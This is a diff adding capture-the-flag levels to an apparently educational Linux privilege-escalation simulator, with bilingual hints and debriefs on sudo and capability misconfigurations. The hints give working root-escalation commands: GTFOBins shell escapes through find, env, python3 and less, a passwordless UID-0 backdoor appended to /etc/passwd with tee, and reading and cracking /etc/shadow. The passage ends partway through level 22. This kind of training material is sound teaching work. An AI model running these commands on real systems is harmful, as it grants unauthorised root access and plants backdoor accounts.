@@ -1223,5 +1223,562 @@ ZW3vYmFja3VwLWtleS1sZWFrZWQtZG8tbm90LXVzZS1pbi1wcm9kAAAAAAECAwQF
                 link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation'
             }
         }
+    },
+
+    // ─────────────────────────────────────────────────────────────
+    // LEVEL 16 — sudo NOPASSWD on find (GTFOBins, distinct from box-01's SUID vector)
+    // ─────────────────────────────────────────────────────────────
+    {
+        id: 16,
+        codename: 'box-16',
+        title: { en: 'Box-16 · Find, Reprised', fr: 'Box-16 · Find, la reprise' },
+        brief: {
+            en: 'sudo lets you run find as root this time — no SUID bit needed. Same binary, same trick, different door.',
+            fr: 'Cette fois sudo t\'autorise find en root — pas besoin de bit SUID. Même binaire, même astuce, porte différente.'
+        },
+        user: 'player',
+        host: 'box-16',
+        cwd: '/home/player',
+        objectives: {
+            en: ['Check your sudo permissions', 'Recall the find -exec trick from GTFOBins', 'Spawn a root shell'],
+            fr: ['Vérifier tes droits sudo', 'Te rappeler l\'astuce find -exec de GTFOBins', 'Ouvrir un shell root']
+        },
+        hints: {
+            en: [
+                'Try: sudo -l',
+                'sudo find works the same way SUID find did — GTFOBins lists it as a shell-spawning binary either way.',
+                'Payload: sudo find . -exec /bin/sh \\;'
+            ],
+            fr: [
+                'Essaie : sudo -l',
+                'sudo find fonctionne comme le find SUID — GTFOBins le liste comme binaire capable d\'ouvrir un shell dans les deux cas.',
+                'Payload : sudo find . -exec /bin/sh \\;'
+            ]
+        },
+        flag: 'flag{sud0_find_rebo0t}',
+        fs: {
+            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
+            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
+            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
+            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
+            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers'] },
+            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
+            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
+            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
+            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{sud0_find_rebo0t}\n' },
+            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
+            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'find'] },
+            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/sudo': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary' },
+            '/usr/bin/find': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
+            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
+            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
+            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
+        },
+        sudoers: {
+            player: [
+                { cmd: '/usr/bin/find', nopasswd: true, runas: 'root' }
+            ]
+        },
+        wins: [
+            { type: 'sudo_shell' }
+        ],
+        debrief: {
+            en: {
+                vuln: 'Sudoers misconfiguration — NOPASSWD on find',
+                why: "Whether find gets its power from a SUID bit or a sudo rule, the outcome is identical: -exec lets it launch an arbitrary program, and that program inherits root. The delivery mechanism differs, but GTFOBins' advice is the same either way.",
+                fix: 'Never grant sudo on general-purpose file tools. If find must run as root for a specific task, wrap it in a script with fixed arguments and no -exec/-delete, and reference GTFOBins before writing any sudoers rule.',
+                link: 'https://gtfobins.github.io/gtfobins/find/'
+            },
+            fr: {
+                vuln: 'Mauvaise config sudoers — NOPASSWD sur find',
+                why: "Que find tienne sa puissance d'un bit SUID ou d'une règle sudo, le résultat est identique : -exec lui permet de lancer un programme arbitraire, qui hérite des droits root. Le vecteur diffère, le conseil GTFOBins reste le même.",
+                fix: 'Ne jamais donner sudo sur un outil de fichiers généraliste. Si find doit tourner en root pour une tâche précise, encapsule-le dans un script à arguments figés, sans -exec/-delete, et vérifie GTFOBins avant d\'écrire la moindre règle sudoers.',
+                link: 'https://gtfobins.github.io/gtfobins/find/'
+            }
+        }
+    },
+
+    // ─────────────────────────────────────────────────────────────
+    // LEVEL 17 — sudo NOPASSWD on env (GTFOBins)
+    // ─────────────────────────────────────────────────────────────
+    {
+        id: 17,
+        codename: 'box-17',
+        title: { en: 'Box-17 · Environmentally Unfriendly', fr: 'Box-17 · Environnement hostile' },
+        brief: {
+            en: 'sudo lets you run env as root. env can launch any program you hand it — including a shell.',
+            fr: 'sudo t\'autorise env en root. env peut lancer n\'importe quel programme qu\'on lui passe — y compris un shell.'
+        },
+        user: 'player',
+        host: 'box-17',
+        cwd: '/home/player',
+        objectives: {
+            en: ['Check your sudo permissions', 'Recognise env on GTFOBins', 'Use it to launch a root shell'],
+            fr: ['Vérifier tes droits sudo', 'Reconnaître env sur GTFOBins', 'L\'utiliser pour lancer un shell root']
+        },
+        hints: {
+            en: [
+                'Try: sudo -l',
+                'env normally sets environment variables then runs a command. Give it a shell instead. Check GTFOBins for "env".',
+                'Payload: sudo env /bin/sh'
+            ],
+            fr: [
+                'Essaie : sudo -l',
+                'env sert normalement à poser des variables d\'environnement puis lancer une commande. Donne-lui un shell à la place. Regarde GTFOBins pour "env".',
+                'Payload : sudo env /bin/sh'
+            ]
+        },
+        flag: 'flag{env_v4r_r00t}',
+        fs: {
+            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
+            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
+            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
+            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
+            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers'] },
+            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
+            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
+            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
+            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{env_v4r_r00t}\n' },
+            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
+            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'env'] },
+            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/sudo': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary' },
+            '/usr/bin/env': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
+            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
+            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
+            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
+        },
+        sudoers: {
+            player: [
+                { cmd: '/usr/bin/env', nopasswd: true, runas: 'root' }
+            ]
+        },
+        wins: [
+            { type: 'sudo_shell' }
+        ],
+        debrief: {
+            en: {
+                vuln: 'Sudoers misconfiguration — NOPASSWD on env',
+                why: "env's whole job is to run a command with a modified environment. sudo env /bin/sh skips the environment tweak and just runs /bin/sh — as root, since that's who sudo made env run as.",
+                fix: 'Never grant sudo on env, or on any wrapper capable of launching an arbitrary program. If a script legitimately needs env, invoke it directly with a hard-coded target instead of exposing sudo to the raw binary.',
+                link: 'https://gtfobins.github.io/gtfobins/env/'
+            },
+            fr: {
+                vuln: 'Mauvaise config sudoers — NOPASSWD sur env',
+                why: "Le rôle d'env est de lancer une commande avec un environnement modifié. sudo env /bin/sh saute la modification et lance simplement /bin/sh — en root, puisque c'est sous cette identité que sudo a fait tourner env.",
+                fix: 'Ne jamais donner sudo sur env, ni sur un wrapper capable de lancer un programme arbitraire. Si un script a légitimement besoin d\'env, appelle-le directement avec une cible figée plutôt que d\'exposer sudo sur le binaire brut.',
+                link: 'https://gtfobins.github.io/gtfobins/env/'
+            }
+        }
+    },
+
+    // ─────────────────────────────────────────────────────────────
+    // LEVEL 18 — sudo NOPASSWD on python3 (GTFOBins)
+    // ─────────────────────────────────────────────────────────────
+    {
+        id: 18,
+        codename: 'box-18',
+        title: { en: 'Box-18 · The Interpreter\'s Gambit', fr: 'Box-18 · Le gambit de l\'interpréteur' },
+        brief: {
+            en: 'sudo lets you run python3 as root. Any interpreter that can shell out is a root shell in disguise.',
+            fr: 'sudo t\'autorise python3 en root. Tout interpréteur capable d\'ouvrir un shell est un shell root déguisé.'
+        },
+        user: 'player',
+        host: 'box-18',
+        cwd: '/home/player',
+        objectives: {
+            en: ['Check your sudo permissions', 'Use python3\'s os.system to spawn a shell', 'Confirm root'],
+            fr: ['Vérifier tes droits sudo', 'Utiliser os.system de python3 pour ouvrir un shell', 'Confirmer root']
+        },
+        hints: {
+            en: [
+                'Try: sudo -l',
+                'python3 -c lets you run arbitrary Python. os.system() shells out. Check GTFOBins for "python".',
+                'Payload: sudo python3 -c \'import os; os.system("/bin/sh")\''
+            ],
+            fr: [
+                'Essaie : sudo -l',
+                'python3 -c exécute du Python arbitraire. os.system() ouvre un shell. Regarde GTFOBins pour "python".',
+                'Payload : sudo python3 -c \'import os; os.system("/bin/sh")\''
+            ]
+        },
+        flag: 'flag{pyth0n_0s_syst3m}',
+        fs: {
+            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
+            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
+            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
+            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
+            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers'] },
+            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
+            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
+            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
+            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{pyth0n_0s_syst3m}\n' },
+            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
+            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'python3'] },
+            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/sudo': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary' },
+            '/usr/bin/python3': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
+            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
+            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
+            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
+        },
+        sudoers: {
+            player: [
+                { cmd: '/usr/bin/python3', nopasswd: true, runas: 'root' }
+            ]
+        },
+        wins: [
+            { type: 'sudo_shell' }
+        ],
+        debrief: {
+            en: {
+                vuln: 'Sudoers misconfiguration — NOPASSWD on python3',
+                why: 'python3 -c runs arbitrary code, and os.system() calls straight into the shell. sudo grants that code root, so a one-liner is enough to get a root shell — the same pattern applies to perl, ruby, and any other scripting interpreter.',
+                fix: 'Never grant sudo on a general-purpose interpreter. If a Python script must run as root, ship it as a fixed, reviewed script — never as sudo access to the interpreter itself.',
+                link: 'https://gtfobins.github.io/gtfobins/python/'
+            },
+            fr: {
+                vuln: 'Mauvaise config sudoers — NOPASSWD sur python3',
+                why: 'python3 -c exécute du code arbitraire, et os.system() appelle directement le shell. sudo donne les droits root à ce code : un one-liner suffit pour un shell root — le même schéma s\'applique à perl, ruby et tout autre interpréteur de script.',
+                fix: 'Ne jamais donner sudo sur un interpréteur généraliste. Si un script Python doit tourner en root, livre-le comme script figé et revu — jamais comme un accès sudo à l\'interpréteur lui-même.',
+                link: 'https://gtfobins.github.io/gtfobins/python/'
+            }
+        }
+    },
+
+    // ─────────────────────────────────────────────────────────────
+    // LEVEL 19 — sudo NOPASSWD on less (GTFOBins pager escape)
+    // ─────────────────────────────────────────────────────────────
+    {
+        id: 19,
+        codename: 'box-19',
+        title: { en: 'Box-19 · Pager, Interrupted', fr: 'Box-19 · Le pager interrompu' },
+        brief: {
+            en: 'sudo lets you run the less pager as root. Pagers let you shell out to run other commands mid-view.',
+            fr: 'sudo t\'autorise le pager less en root. Les pagers laissent lancer d\'autres commandes en cours de lecture.'
+        },
+        user: 'player',
+        host: 'box-19',
+        cwd: '/home/player',
+        objectives: {
+            en: ['Check your sudo permissions', 'Recall the pager shell-escape trick', 'Spawn a root shell'],
+            fr: ['Vérifier tes droits sudo', 'Te rappeler l\'astuce d\'échappement des pagers', 'Ouvrir un shell root']
+        },
+        hints: {
+            en: [
+                'Try: sudo -l',
+                'In a real terminal you\'d open less, press "!" and type /bin/sh to shell out. Check GTFOBins for "less".',
+                'This simulator reproduces the escape directly on one line: sudo less !/bin/sh'
+            ],
+            fr: [
+                'Essaie : sudo -l',
+                'Dans un vrai terminal, tu ouvrirais less, taperais "!" puis /bin/sh pour sortir vers un shell. Regarde GTFOBins pour "less".',
+                'Ce simulateur reproduit l\'échappement directement sur une ligne : sudo less !/bin/sh'
+            ]
+        },
+        flag: 'flag{l3ss_is_r00t}',
+        fs: {
+            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
+            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
+            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
+            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
+            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers'] },
+            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
+            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
+            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
+            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{l3ss_is_r00t}\n' },
+            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
+            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'less'] },
+            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/sudo': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary' },
+            '/usr/bin/less': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
+            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
+            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
+            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
+        },
+        sudoers: {
+            player: [
+                { cmd: '/usr/bin/less', nopasswd: true, runas: 'root' }
+            ]
+        },
+        wins: [
+            { type: 'sudo_shell' }
+        ],
+        debrief: {
+            en: {
+                vuln: 'Sudoers misconfiguration — NOPASSWD on less',
+                why: 'less (like more, man, and most pagers) supports a "!command" shell-escape so you can run a quick command without leaving the viewer. Under sudo, that escaped command runs as root — an instant root shell from a program whose only job is supposed to be showing text.',
+                fix: 'Never grant sudo on a pager or viewer. If a user genuinely needs to page through root-owned logs, use a restricted wrapper (or sudoedit-style tooling) instead of raw sudo access to less/more/man.',
+                link: 'https://gtfobins.github.io/gtfobins/less/'
+            },
+            fr: {
+                vuln: 'Mauvaise config sudoers — NOPASSWD sur less',
+                why: 'less (comme more, man et la plupart des pagers) propose un échappement shell "!commande" pour lancer une commande rapide sans quitter la visionneuse. Sous sudo, cette commande échappée tourne en root — un shell root instantané depuis un programme censé seulement afficher du texte.',
+                fix: 'Ne jamais donner sudo sur un pager ou une visionneuse. Si un utilisateur doit vraiment feuilleter des logs appartenant à root, utilise un wrapper restreint (ou un outillage type sudoedit) plutôt qu\'un accès sudo brut à less/more/man.',
+                link: 'https://gtfobins.github.io/gtfobins/less/'
+            }
+        }
+    },
+
+    // ─────────────────────────────────────────────────────────────
+    // LEVEL 20 — sudo NOPASSWD on tee, piped into /etc/passwd (GTFOBins)
+    // ─────────────────────────────────────────────────────────────
+    {
+        id: 20,
+        codename: 'box-20',
+        title: { en: 'Box-20 · Tee\'d Off', fr: 'Box-20 · À bout de tee' },
+        brief: {
+            en: '/etc/passwd is locked down this time — but sudo lets you run tee as root, and tee writes wherever it is pointed.',
+            fr: '/etc/passwd est verrouillé cette fois — mais sudo t\'autorise tee en root, et tee écrit là où on le pointe.'
+        },
+        user: 'player',
+        host: 'box-20',
+        cwd: '/home/player',
+        objectives: {
+            en: ['Check your sudo permissions', 'Pipe a rogue UID-0 line into tee -a', 'Switch to your new root account'],
+            fr: ['Vérifier tes droits sudo', 'Envoyer une ligne UID 0 dans tee -a via un pipe', 'Basculer sur ton nouveau compte root']
+        },
+        hints: {
+            en: [
+                'Try: sudo -l — a plain "echo >> /etc/passwd" will fail, the file isn\'t writable this time.',
+                'tee reads from a pipe and writes to any file it\'s given — running it under sudo makes that write happen as root.',
+                'Payload: echo \'r00t::0:0::/root:/bin/bash\' | sudo tee -a /etc/passwd   then   su r00t'
+            ],
+            fr: [
+                'Essaie : sudo -l — un simple "echo >> /etc/passwd" échouera, le fichier n\'est pas modifiable cette fois.',
+                'tee lit depuis un pipe et écrit dans le fichier qu\'on lui donne — le lancer sous sudo fait de cette écriture une écriture root.',
+                'Payload : echo \'r00t::0:0::/root:/bin/bash\' | sudo tee -a /etc/passwd   puis   su r00t'
+            ]
+        },
+        flag: 'flag{te3_p1ped_r00t}',
+        fs: {
+            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
+            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
+            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
+            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
+            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers'] },
+            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
+            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
+            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
+            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{te3_p1ped_r00t}\n' },
+            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
+            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'tee'] },
+            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/sudo': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary' },
+            '/usr/bin/tee': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
+            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
+            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
+            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
+        },
+        sudoers: {
+            player: [
+                { cmd: '/usr/bin/tee', nopasswd: true, runas: 'root' }
+            ]
+        },
+        wins: [
+            { type: 'passwd_write' }
+        ],
+        debrief: {
+            en: {
+                vuln: 'Sudoers misconfiguration — NOPASSWD on tee',
+                why: "tee has no interpreter to abuse and no shell flag — it just copies stdin to a file. That's exactly the problem: sudo tee can overwrite or append to *any* file as root, including /etc/passwd. A piped-in UID-0 line with an empty password field creates an instant backdoor account.",
+                fix: 'Never grant sudo on tee (or cp, dd, cat with redirection) without restricting the target path. If root-owned logs need updating by a script, use a purpose-built wrapper that validates the destination instead of a raw file-write primitive.',
+                link: 'https://gtfobins.github.io/gtfobins/tee/'
+            },
+            fr: {
+                vuln: 'Mauvaise config sudoers — NOPASSWD sur tee',
+                why: "tee n'a ni interpréteur à détourner ni option shell — il recopie simplement stdin vers un fichier. C'est justement le problème : sudo tee peut écraser ou compléter n'importe quel fichier en root, y compris /etc/passwd. Une ligne UID 0 envoyée par pipe, avec un champ mot de passe vide, crée un compte porte dérobée instantané.",
+                fix: 'Ne jamais donner sudo sur tee (ni cp, dd, ou cat avec redirection) sans restreindre la cible. Si un script doit légitimement mettre à jour des fichiers root, utilise un wrapper dédié qui valide la destination plutôt qu\'une primitive d\'écriture brute.',
+                link: 'https://gtfobins.github.io/gtfobins/tee/'
+            }
+        }
+    },
+
+    // ─────────────────────────────────────────────────────────────
+    // LEVEL 21 — cap_dac_read_search+ep on python3: read /etc/shadow, crack it
+    // ─────────────────────────────────────────────────────────────
+    {
+        id: 21,
+        codename: 'box-21',
+        title: { en: 'Box-21 · Beyond Discretionary Access', fr: 'Box-21 · Au-delà du contrôle discrétionnaire' },
+        brief: {
+            en: 'SUID audit is clean and sudo -l is empty. But capabilities strike again — this time one that skips read permission checks entirely.',
+            fr: 'L\'audit SUID est propre et sudo -l est vide. Mais les capabilities frappent encore — cette fois une qui court-circuite entièrement les vérifications de lecture.'
+        },
+        user: 'player',
+        host: 'box-21',
+        cwd: '/home/player',
+        objectives: {
+            en: ['List capabilities on the system', 'Read /etc/shadow despite its permissions', 'Crack the root hash', 'Log in as root'],
+            fr: ['Lister les capabilities du système', 'Lire /etc/shadow malgré ses permissions', 'Casser le hash de root', 'Te connecter en root']
+        },
+        hints: {
+            en: [
+                'Try: getcap -r / 2>/dev/null',
+                'cap_dac_read_search bypasses discretionary access control (DAC) — the usual owner/mode checks — for reads and directory traversal. python3 has it.',
+                'python3 -c "print(open(\'/etc/shadow\').read())" — then crack the copy it leaves behind: john /tmp/shadow.copy, then su root'
+            ],
+            fr: [
+                'Essaie : getcap -r / 2>/dev/null',
+                'cap_dac_read_search contourne le contrôle d\'accès discrétionnaire (DAC) — les vérifications habituelles owner/mode — pour la lecture et la traversée de dossiers. python3 l\'a.',
+                'python3 -c "print(open(\'/etc/shadow\').read())" — puis casse la copie laissée derrière : john /tmp/shadow.copy, puis su root'
+            ]
+        },
+        flag: 'flag{cap_dac_sh4d0w_pwn}',
+        crackedPassword: 'R00tShad0w!2024',
+        fs: {
+            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
+            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
+            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['HINT.txt'] },
+            '/home/player/HINT.txt': { type: 'file', owner: 'player', mode: '644', content: 'sudo -l came back empty and there\'s no stray SUID bit anywhere.\nRemember box-03? Capabilities aren\'t just for setuid.\n' },
+            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'shadow', 'sudoers'] },
+            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
+            '/etc/shadow': { type: 'file', owner: 'root', mode: '600', content: 'root:$6$Rd4nD0m$aVeryFakeHashString1234567890abcdefghijklmno.:19700:0:99999:7:::\nplayer:!:19700:0:99999:7:::\n' },
+            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
+            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
+            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{cap_dac_sh4d0w_pwn}\n' },
+            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
+            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'python3', 'getcap', 'setcap', 'john'] },
+            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/python3': { type: 'file', owner: 'root', mode: '755', capabilities: 'cap_dac_read_search+ep', content: 'ELF binary' },
+            '/usr/bin/getcap': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/setcap': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/john': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
+            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
+            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
+            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
+        },
+        sudoers: { player: [] },
+        wins: [
+            { type: 'shadow_crack' }
+        ],
+        harden: {
+            target: '/usr/bin/python3',
+            type: 'unset_cap',
+            hint: { en: 'setcap -r /usr/bin/python3', fr: 'setcap -r /usr/bin/python3' }
+        },
+        debrief: {
+            en: {
+                vuln: 'Linux capability cap_dac_read_search+ep on python3',
+                why: 'cap_dac_read_search grants a process the kernel-level ability to bypass file *read* and directory-traversal permission checks — independent of file ownership or mode. A one-line open()/read() in python3 pulls /etc/shadow straight out, hash and all, with no exploit needed beyond calling open().',
+                fix: 'Remove the capability with setcap -r /usr/bin/python3, and audit for cap_dac_read_search / cap_dac_override on any interpreter or archiving tool (tar, python, perl) the same way you\'d audit for SUID. Rotate any credentials whose hash may already be exposed.',
+                link: 'https://gtfobins.github.io/gtfobins/python/#capabilities'
+            },
+            fr: {
+                vuln: 'Capability Linux cap_dac_read_search+ep sur python3',
+                why: 'cap_dac_read_search donne à un processus la capacité, au niveau noyau, de contourner les vérifications de permission de *lecture* et de traversée de dossier — indépendamment du propriétaire ou du mode du fichier. Un simple open()/read() en python3 extrait /etc/shadow directement, hash compris, sans exploit au-delà d\'un appel à open().',
+                fix: 'Retire la capability avec setcap -r /usr/bin/python3, et audite cap_dac_read_search / cap_dac_override sur tout interpréteur ou outil d\'archivage (tar, python, perl) comme tu le ferais pour un SUID. Change tout mot de passe dont le hash a pu être exposé.',
+                link: 'https://gtfobins.github.io/gtfobins/python/#capabilities'
+            }
+        }
+    },
+
+    // ─────────────────────────────────────────────────────────────
+    // LEVEL 22 — sudo env_keep leaks LD_LIBRARY_PATH (distinct from LD_PRELOAD)
+    // ─────────────────────────────────────────────────────────────
+    {
+        id: 22,
+        codename: 'box-22',
+        title: { en: 'Box-22 · The Missing Library', fr: 'Box-22 · La bibliothèque manquante' },
+        brief: {
+            en: 'sudo preserves LD_LIBRARY_PATH this time, not LD_PRELOAD. A root-run helper is missing one specific shared library — plant it yourself.',
+            fr: 'Cette fois sudo préserve LD_LIBRARY_PATH, pas LD_PRELOAD. Un utilitaire lancé en root cherche une bibliothèque partagée précise — plante-la toi-même.'
+        },
+        user: 'player',
+        host: 'box-22',
+        cwd: '/home/player',
+        objectives: {
